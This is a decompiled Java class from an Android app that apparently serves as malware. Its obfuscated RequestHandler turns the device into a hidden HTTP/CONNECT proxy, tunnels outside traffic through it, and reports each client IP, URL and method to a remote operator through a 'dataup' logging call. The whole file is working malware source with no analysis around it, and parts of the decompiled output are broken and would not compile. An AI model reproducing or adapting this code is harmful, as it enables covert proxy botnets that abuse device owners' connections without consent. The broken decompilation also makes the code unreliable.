/*
 * Decompiled with CFR 0.152.
 * 
 * Could not load the following classes:
 *  android.content.Context
 *  org.json.JSONObject
 */
package linker.resourcer.encoder;

import android.content.Context;
import java.io.BufferedReader;
import java.io.BufferedWriter;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.io.OutputStreamWriter;
import java.io.PrintWriter;
import java.io.Reader;
import java.io.Writer;
import java.net.HttpURLConnection;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketAddress;
import java.net.URL;
import linker.resourcer.encoder.RequestHandler$$ExternalSyntheticLambda0;
import linker.resourcer.encoder.RequestHandler$$ExternalSyntheticLambda1;
import linker.resourcer.encoder.etkmbyodxlwuglfdj;
import linker.resourcer.encoder.maagohqzehyoivaxlfkohrpeu;
import org.json.JSONObject;

/*
 * Illegal identifiers - consider using --renameillegalidents true
 */
public class RequestHandler
implements Runnable {
    private final Socket clientSocket;
    private final Context ctx;

    public RequestHandler(Socket socket, Context context) {
        this.clientSocket = socket;
        this.ctx = context;
    }

    private void handleConnectMethod(String object) {
        object = ((String)object).split(":");
        Object object2 = object[0];
        try {
            int n = Integer.parseInt(object[1]);
            object = new Socket();
            Object object3 = new InetSocketAddress((String)object2, n);
            ((Socket)object).connect((SocketAddress)object3);
            object2 = this.clientSocket.getOutputStream();
            object3 = new PrintWriter((OutputStream)object2);
            ((PrintWriter)object3).write("HTTP/1.1 200 Connection Established\r\n");
            ((PrintWriter)object3).write("Proxy-agent: JavaProxy\r\n");
            ((PrintWriter)object3).write("\r\n");
            ((PrintWriter)object3).flush();
            object3 = ((Socket)object).getInputStream();
            Object object4 = ((Socket)object).getOutputStream();
            Runnable runnable2 = new RequestHandler$$ExternalSyntheticLambda0(this, (OutputStream)object4);
            object2 = new Thread(runnable2);
            runnable2 = new RequestHandler$$ExternalSyntheticLambda1(this, (InputStream)object3);
            object4 = new Thread(runnable2);
            ((Thread)object2).start();
            ((Thread)object4).start();
            ((Thread)object2).join();
            ((Thread)object4).join();
            ((Socket)object).close();
        }
        catch (Exception exception) {
            maagohqzehyoivaxlfkohrpeu.Error("RequestHandler", "Error handling CONNECT method" + exception.getMessage());
            this.logserver("ERROR 3", exception.getMessage(), "...");
        }
    }

    /*
     * WARNING - Removed back jump from a try to a catch block - possible behaviour change.
     * Unable to fully structure code
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    private void handleHttpRequest(String var1_1, String var2_7, String[] var3_8, BufferedReader var4_9, OutputStream var5_10) {
        block17: {
            try {
                var9_11 = System.getProperty("http.agent");
            }
            catch (IOException var1_5) {
                // empty catch block
                break block17;
            }
            try {
                var10_12 = new URL((String)var2_7);
                var2_7 = (HttpURLConnection)var10_12.openConnection();
                var2_7.setRequestMethod((String)var1_1);
                var7_13 = -1;
                for (var6_14 = 1; var6_14 < ((Object)var3_8).length; ++var6_14) {
                    var10_12 = var3_8[var6_14].split(": ");
                    var8_15 = var7_13;
                    if (var10_12.length == 2) {
                        if (var10_12[0].equalsIgnoreCase("User-Agent")) {
                            var2_7.setRequestProperty("User-Agent", (String)var9_11);
                            var8_15 = var7_13;
                        } else {
                            var2_7.setRequestProperty(var10_12[0], var10_12[1]);
                            var8_15 = var7_13;
                            if (var10_12[0].equalsIgnoreCase("Content-Length")) {
                                var8_15 = Integer.parseInt(var10_12[1]);
                            }
                        }
                    }
                    var7_13 = var8_15;
                }
            }
            catch (IOException var1_4) {
                break block17;
            }
            {
                if (!var1_1.equals("POST") && !var1_1.equals("PUT")) ** GOTO lbl46
                var2_7.setDoOutput(true);
                var1_1 = var2_7.getOutputStream();
                if (var7_13 <= 0) ** GOTO lbl40
                var3_8 = new char[var7_13];
            }
            try {
                block18: {
                    if (var4_9.read((char[])var3_8, 0, var7_13) > 0) {
                        var4_9 = new String((char[])var3_8);
                        var1_1.write(var4_9.getBytes());
                        var1_1.flush();
                    }
                    break block18;
lbl40:
                    // 1 sources

                    var9_11 = new OutputStreamWriter((OutputStream)var1_1);
                    var3_8 = new BufferedWriter((Writer)var9_11);
                    while ((var1_1 = var4_9.readLine()) != null) {
                        var3_8.write((String)var1_1);
                        var3_8.flush();
                    }
                }
                var6_14 = var2_7.getResponseCode();
                var1_1 = var6_14 >= 200 && var6_14 < 400 ? var2_7.getInputStream() : var2_7.getErrorStream();
                var3_8 = new InputStreamReader((InputStream)var1_1);
                var2_7 = new BufferedReader((Reader)var3_8);
                var1_1 = new StringBuilder();
                while ((var3_8 = var2_7.readLine()) != null) {
                    var1_1.append((String)var3_8).append("\r\n");
                }
            }
            catch (IOException var1_3) {
                break block17;
            }
            try {
                var2_7 = new PrintWriter(var5_10);
                var3_8 = new StringBuilder();
                var2_7.write(var3_8.append("HTTP/1.1 ").append(var6_14).append(" \r\n").toString());
                var2_7.write(var1_1.toString());
                var2_7.flush();
                return;
            }
            catch (IOException var1_2) {}
        }
        maagohqzehyoivaxlfkohrpeu.Error("RequestHandler", "Error handling HTTP request" + var1_6.getMessage());
        this.logserver("ERROR 5", var1_6.getMessage(), "...");
    }

    private void logserver(String string2, String string3, String string4) {
        try {
            JSONObject jSONObject = new JSONObject();
            jSONObject.put("ctype", (Object)"dataup");
            jSONObject.put("oip", (Object)string2);
            jSONObject.put("purl", (Object)string3);
            jSONObject.put("pmth", (Object)string4);
            etkmbyodxlwuglfdj.instance(this.ctx).ProxyMsg(this.ctx, jSONObject);
        }
        catch (Exception exception) {
            maagohqzehyoivaxlfkohrpeu.Error("logserver", "Error " + exception.getMessage());
            exception.printStackTrace();
        }
    }

    /*
     * Unable to fully structure code
     */
    private void tunnelData(InputStream var1_1, OutputStream var2_4) {
        var4_5 = new byte[4096];
        ** while ((var3_6 = var1_1.read((byte[])var4_5)) != -1)
lbl-1000:
        // 1 sources

        {
            try {
                var2_4.write(var4_5, 0, var3_6);
                var2_4.flush();
                continue;
            }
            catch (IOException var1_2) {
                try {
                    if (!var1_2.getMessage().contains("Broken pipe")) {
                        throw var1_2;
                    }
                    maagohqzehyoivaxlfkohrpeu.Error("RequestHandler", "Broken pipe detected, stopping data tunneling.");
                    break;
                }
                catch (IOException var1_3) {
                    maagohqzehyoivaxlfkohrpeu.Error("RequestHandler", "Error tunneling data: " + var1_3.getMessage());
                    this.logserver("ERROR 4", var1_3.getMessage(), "...");
                    break;
                }
            }
        }
lbl18:
        // 3 sources

    }

    /* synthetic */ void lambda$handleConnectMethod$0$com-icontrol-protector-RequestHandler(OutputStream outputStream) {
        try {
            this.tunnelData(this.clientSocket.getInputStream(), outputStream);
            return;
        }
        catch (IOException iOException) {
            throw new RuntimeException(iOException);
        }
    }

    /* synthetic */ void lambda$handleConnectMethod$1$com-icontrol-protector-RequestHandler(InputStream inputStream) {
        try {
            this.tunnelData(inputStream, this.clientSocket.getOutputStream());
            return;
        }
        catch (IOException iOException) {
            throw new RuntimeException(iOException);
        }
    }

    /*
     * WARNING - Removed back jump from a try to a catch block - possible behaviour change.
     * Loose catch block
     * WARNING - void declaration
     * Enabled aggressive block sorting
     * Enabled unnecessary exception pruning
     * Enabled aggressive exception aggregation
     */
    @Override
    public void run() {
        Throwable throwable2222;
        block13: {
            void iOException7;
            Object object;
            block14: {
                block15: {
                    boolean bl;
                    String[] stringArray = this.clientSocket.getInputStream();
                    Object object2 = this.clientSocket.getOutputStream();
                    Object object3 = new InputStreamReader((InputStream)stringArray);
                    object = new BufferedReader((Reader)object3);
                    object3 = new StringBuilder();
                    while (!(bl = (stringArray = ((BufferedReader)object).readLine()).isEmpty())) {
                        ((StringBuilder)object3).append((String)stringArray).append("\r\n");
                    }
                    stringArray = ((StringBuilder)object3).toString().split("\r\n");
                    Object object4 = stringArray[0].split(" ");
                    {
                        catch (Throwable throwable2222) {
                            break block13;
                        }
                        catch (IOException iOException422) {}
                        {
                            object2 = new StringBuilder();
                            maagohqzehyoivaxlfkohrpeu.Error("RequestHandler", ((StringBuilder)object2).append("Error handling client request").append(iOException422.getMessage()).toString());
                            this.logserver("ERROR", iOException422.getMessage(), "...");
                        }
                        try {
                            this.clientSocket.close();
                            return;
                        }
                        catch (IOException iOException6) {
                            object = new StringBuilder();
                            break block14;
                        }
                    }
                    object3 = object4[0];
                    object4 = object4[1];
                    {
                        CharSequence charSequence = new StringBuilder();
                        maagohqzehyoivaxlfkohrpeu.Debug("RequestHandler", charSequence.append("Request Method: ").append((String)object3).toString());
                        charSequence = new StringBuilder();
                        maagohqzehyoivaxlfkohrpeu.Debug("RequestHandler", charSequence.append("Requested URL: ").append((String)object4).toString());
                        charSequence = this.clientSocket.getInetAddress().getHostAddress();
                        StringBuilder stringBuilder = new StringBuilder();
                        maagohqzehyoivaxlfkohrpeu.Debug("RequestHandler", stringBuilder.append("clientIpAddress: ").append((String)charSequence).toString());
                        this.logserver((String)charSequence, (String)object4, (String)object3);
                        if (((String)object3).equalsIgnoreCase("CONNECT")) {
                            this.handleConnectMethod((String)object4);
                            break block15;
                        }
                        this.handleHttpRequest((String)object3, (String)object4, stringArray, (BufferedReader)object, (OutputStream)object2);
                    }
                }
                try {
                    this.clientSocket.close();
                    return;
                }
                catch (IOException iOException3) {
                    object = new StringBuilder();
                }
            }
            maagohqzehyoivaxlfkohrpeu.Error("RequestHandler", ((StringBuilder)object).append("Error closing client socket").append(iOException7.getMessage()).toString());
            this.logserver("ERROR 2", iOException7.getMessage(), "...");
            return;
        }
        try {
            this.clientSocket.close();
            throw throwable2222;
        }
        catch (IOException iOException2) {
            maagohqzehyoivaxlfkohrpeu.Error("RequestHandler", "Error closing client socket" + iOException2.getMessage());
            this.logserver("ERROR 2", iOException2.getMessage(), "...");
        }
        throw throwable2222;
    }
}

